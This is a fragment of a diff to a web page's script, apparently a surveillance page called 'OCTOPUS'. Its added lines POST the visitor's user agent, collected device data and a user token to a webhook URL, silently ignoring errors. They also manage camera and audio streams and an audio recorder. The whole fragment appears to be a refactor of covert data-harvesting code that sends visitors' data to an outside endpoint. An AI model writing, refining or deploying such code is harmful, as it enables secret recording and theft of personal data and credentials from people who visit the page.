         formData.append('userAgent', navigator.userAgent);
-        formData.append('deviceData', JSON.stringify(collectedData));
-        formData.append('token', USER_TOKEN);
-        fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
+        formData.append('deviceData', JSON.stringify(state.collectedData));
+        formData.append('token', state.userToken);
+        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
     } catch (e) {}
 });
 
 window.addEventListener('beforeunload', () => {
-    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
-    if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+    if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
+    if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
+    if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
 });
 
-console.log('✅ النسخة الجراحية النهائية جاهزة.');
+console.log('✅ OCTOPUS 外科医生版本已加载');
 </script>
 </body>
 </html>
